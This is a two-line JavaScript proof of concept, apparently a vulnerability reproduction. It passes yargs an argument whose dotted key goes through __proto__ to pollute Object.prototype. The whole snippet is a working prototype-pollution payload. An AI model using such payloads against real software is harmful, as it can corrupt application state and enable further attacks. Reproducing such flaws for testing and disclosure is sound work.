const yargs = require("yargs");
yargs("--foo.__proto__.polluted.prop yes").argv;
